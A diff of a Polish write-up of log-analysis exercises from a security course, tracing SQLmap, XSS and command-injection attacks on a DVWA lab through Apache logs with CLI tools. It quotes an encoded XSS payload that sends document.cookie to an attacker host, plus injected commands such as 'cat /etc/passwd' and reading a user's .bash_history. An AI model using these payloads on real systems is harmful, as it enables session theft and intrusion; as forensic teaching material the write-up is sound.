@@ -4,14 +4,14 @@
 1. **Jak duży jest plik logów?** 
 Używamy popularnych komend do sprawdzania wielkości plików/folderów: **du i ls**
 
-![alt](courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/1-image.png)
+![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/1-image.png)
 
 **Odp. 2840 KB (2.8 Megabajta)**
 
 2. **Jaki zakres czasu jest zawarty w logach?** 
 Używamy dwóch komend - head i tail do sprawdzenia początku i końca logów.
 
-![alt|697](courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/2-image.png)
+![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/2-image.png)
 
 **Odp. 24/May/2022:04:13:49 +0200 UTC - 24/May/2022:05:27:40 +0200 UTC****
 
@@ -19,12 +19,12 @@ Używamy dwóch komend - head i tail do sprawdzenia początku i końca logów.
 
 Sprawdzamy sobie pierwsze 20 pozycji za pomocą head, by zweryfikować jaki mamy format:
 
-![alt](courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/3-image.png)
+![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/3-image.png)
 
 Odp. **Format: *apache combined* - na końcu ma Referrer i User-Agent w cudzysłowaćh**
 https://httpd.apache.org/docs/2.4/logs.html
 
-![alt](courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/4-image.png)
+![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/4-image.png)
 
 **Plik jest kopią: *other_vhost_access.log* - zwykle ten plik zaczyna się od nazwy hosta (wirtualnego) - dopiero potem IP.**
 
@@ -32,7 +32,7 @@ https://httpd.apache.org/docs/2.4/logs.html
 
 Użyjemy komendy cat 1access.log | cut -d' ' -f2 | sort | uniq -c - wyodrębnia ona adresy z pola drugiego, zlicza je i pokazuje, ile żądań wysłał każdy adres. Zlicza ona adresy IP na całym pliku także zakres czasu już wcześniej powinien być zawężony do odpowiedniego fragmentu.
 
-![alt](courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/5-image.png)
+![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/5-image.png)
 
 **Odp. Ilość 12898. Wysyłał tylko jeden adres IP: 30.13.3.7**
 
@@ -40,7 +40,7 @@ Użyjemy komendy cat 1access.log | cut -d' ' -f2 | sort | uniq -c - wyodrębnia 
 
 W tym celu użejemy komendy **cat 1access.log | cut -d' ' -f8 | sort | uniq -c | sort -nr | head -5**. Komenda ta wyciąga wartość ósmej kolumny z logu **(żądane zasoby URI)**, sprawdza ile razy każdy z nich wystąpił i pokazuje 5 najczęściej odwiedzanych URI wraz z liczbą żądań.
 
-![alt](courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/7-image.png)
+![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/7-image.png)
 
 **Odp:**
 	6344 /vulnerabilities/sqli/index.php
@@ -53,15 +53,15 @@ W tym celu użejemy komendy **cat 1access.log | cut -d' ' -f8 | sort | uniq -c |
    
 Z kursu wiemy, że do tego możemy użyć komendy **cat 1access.log | cut -d'"' -f6 | sort | uniq -c | sort** Szósta kolumna pokazuje nam zawiera wartości pola `User-Agent`. Możemy tak sprawdzić jakie narzędzia, przeglądarki lub skrypty były używane do komunikacji z aplikacją oraz wskazać nietypowe lub charakterystyczne wpisy mogące należeć do atakującego.
 
-![alt](courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/8-image.png)
+![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/8-image.png)
 
 Możemy założyć że atakujący użył narzędzia SQLmap.** (nawet widać wersję narzędzia 1.5.1) Nie jest to niezbity dowód, bo można to podrobić. Ale - by się jeszcze upewnić - możemy sprawdzić typowe payloady SQL:
 
-![alt](courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/9-image.png)
+![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/9-image.png)
 
 Albo czy techniki SQLi pojawiły się w krótkim czasie:
 
-![alt](courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/10-image.png)
+![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/10-image.png)
 To polecenie wyszukuje typowe ślady SQLi, wyciąga timestampy z logów, grupuje zdarzenia do minuty, i wyrzuca kiedy było najwięcej podejrzanych zapytań. Tutaj mamy takich śladów mnóstwo, więc nasza teoria się potwierdza.
 
 **Odp. Atakujący użył narzędzia SQLmap.**
@@ -70,7 +70,7 @@ To polecenie wyszukuje typowe ślady SQLi, wyciąga timestampy z logów, grupuje
 
 Wyjmijmy sobie pierwsze 25 linikek z logów:
 
-![alt](courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/11-image.png)
+![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/11-image.png)
 
 Już we wczesniejszym pytaniu wyodrębniliśmy jakiego narzędzia użył atakujący. Te narzędzie jest używane do SQL Injection. 
 
@@ -80,7 +80,7 @@ Odp. Jest to technika **SQL Injection**
 
 Grepujemy User-Agentów, które zawierają informacje o przeglądarce. Robię to po to, odsiać normalne wejścia z przeglądarki od ruchu generowanego przez narzędzie atakujące.
 
-![alt](courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/12-image.png)
+![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/12-image.png)
 
 Widać tutaj **dwa momenty**:
 dvwa.com:80 30.13.3.7 - - [24/May/2022:04:13:57 +0200] "POST /login.php HTTP/1.1" 302 337 "http://dvwa.com/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
@@ -99,13 +99,13 @@ https://jakwybrachosting.pl/przekierowanie-302/
 
 1. **Jak duży jest plik logów?** 
 
-![alt](courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/13-image.png)
+![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/13-image.png)
 
 **Odp. 7.1KB.
 
 2. **Jaki zakres czasu jest zawarty w logach?** 
    
-![alt](courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/14-image.png)
+![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/14-image.png)
 
 **Odp. 
 od 24/May/2022:06:24:31 +0200 UTC 
@@ -113,18 +113,18 @@ do 24/May/2022:06:31:10 +0200 UTC**
 
 3. **W jakim for(ma)cie jest plik logów oraz, którego pliku jest kopią?** 
 
-![alt](courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/15-image.png)
+![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/15-image.png)
 **format apache combined - kopia access.log**
 
 4. Ile i jakie adresy IP wysyłały żądania do aplikacji webowej w analizowanym zakresie czasu? 
 
-![alt](courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/16-image.png)
+![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/16-image.png)
 
 **Odp. 2 adresy - 30.13.3.7 i  30.2.13.37**
 
 5. **Przeanalizuj zalogowane parametry useragent. Zidentyfikuj użyte przez atakującego narzędzia.** 
 
-![alt](courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/17-image.png)
+![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/17-image.png)
 
 **Odp: na podstawie parametrów useragent nie widać żadnych narzędzi które zostały użyte w ataku.**
 37 Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
@@ -133,7 +133,7 @@ do 24/May/2022:06:31:10 +0200 UTC**
 
 Użyjemy do tego komendy **cat 2access.log | cut -d"[" -f2 | cut -d" " -f1,4
 
-![alt](courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/18-image.png)
+![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/18-image.png)
 
 Wygląda to na manualny atak - na screenie widać zwykły browser flow czyli: 
 - wejście na /index.php i natychmiastowe dociąganie CSS/JS/obrazów;
@@ -147,7 +147,7 @@ Wygląda to na manualny atak - na screenie widać zwykły browser flow czyli:
 **grep -Eio 'script|img+src' 2access.log | sort | uniq -c | sort -nr**
 Szukamy "wstrzyknięcia" do strony własnego Javascriptu, bazując po słowie "script"
 
-![alt](courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/19-image.png)
+![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/19-image.png)
 
 **Atakujący wstrzyknął: "3Edocument.write%28%27%3Cimg+src%3D%22http%3A%2F%2F30.13.3.7%3A8000%2Fcollect.gif%3Fcookie%3D%27+%2B+document.cookie+%2B+%27%22+%2F%3E%27%29%3C%2Fscript%3"**
 
@@ -155,7 +155,7 @@ Szukamy "wstrzyknięcia" do strony własnego Javascriptu, bazując po słowie "s
 
 8. **Kiedy atakujący wykonał atak?** 
    
-![alt](courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/19-image.png)
+![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/19-image.png)
 
 **Odp. 24/May/2022:06:26:55 UTC**
 
@@ -163,7 +163,7 @@ Szukamy "wstrzyknięcia" do strony własnego Javascriptu, bazując po słowie "s
 
 Bazując na poprzednim screenie: możemy odszyfrować wiadomość w Cyberchefie.
 
-![alt](courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/20-image.png)
+![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/20-image.png)
 
 Powyższy kod wskazuje nam takie rzeczy jak
 - odczytywanie document.cookie 
@@ -176,19 +176,19 @@ Powyższy kod wskazuje nam takie rzeczy jak
 
 1. Jak duży jest plik logów? 
 
-![alt](courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/21-image.png)
+![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/21-image.png)
 
 **Odp. **Size: 11706 - 12 K**
 
 2. Jaki zakres czasu jest zawarty w logach? 
 
-![alt](courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/23-image.png)
+![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/23-image.png)
 
 Odp. **24/May/2022:08:11:21 +0200 do 24/May/2022:09:52:03 +0200**
 
 3. W jakim forcie jest plik logów oraz, którego pliku jest kopią? 
 
-![alt](courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/25-image.png)
+![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/25-image.png)
 
 **Widzimy tu referer - np. "htxp://dvwa[.]com/vulnerabilities/fi/?page=include.php"**
 https://www.ibm.com/docs/en/webmethods-integration/wm-integration-server/11.1.0?topic=log-combined-format
@@ -197,14 +197,16 @@ https://www.ibm.com/docs/en/webmethods-integration/wm-integration-server/11.1.0?
 
 4. Ile i jakie adresy IP wysyłały żądania do aplikacji webowej w analizowanym zakresie czasu? 
 
-![alt](courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/26-image.png)
+![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/26-image.png)
 
 Odp. **1 adres, 30.13.3.7**
 
 5. Przeanalizuj zalogowane parametry useragent. Zidentyfikuj użyte przez atakującego narzędzia.
 
-![alt](courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/25-image.png)
-![alt](courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/27-image.png)
+![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/25-image.png)
+
+![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/27-image.png)
+
 Widzimy tutaj dwa parametry user-agent: przeglądarki oraz "Majkrosoft Edze 100"
 
 Odp. **nie da się dokłądnie określiść - nazwa narzędzia została prawdopodobnie podrobiona na “Majkrosoft Edze 100”**
@@ -221,7 +223,7 @@ Odp. **nie da się dokłądnie określiść - nazwa narzędzia została prawdopo
 
 **cat 3access.log | grep "Majkrosoft Edze 100"
 
-![alt](courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/22-image.png)
+![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/22-image.png)
 
 **Odp:
 - **Remote Code Execution (wykonywanie komend)** – w logach widać parametry command line np. **ls /, whoami, cat /home/vulcan/.bash_history**. Atakujący wpisywał komendy, a serwer je wykonywał.
@@ -233,11 +235,11 @@ Odp. **nie da się dokłądnie określiść - nazwa narzędzia została prawdopo
 **Użyjemy zmodyfikowanego grepa:** 
 cat 3access.log | grep 'cmd=' | cut -d'"' -f2 | cut -d'=' -f3 | cut -d' ' -f1
 
-![alt](courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/31-image.png)
+![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/31-image.png)
 
 Trzeba jeszcze odkodować w CyberChefie:
 
-![alt](courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/29-image.png)
+![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/29-image.png)
 
 **Odp.** 
 - cat /etc/passwd
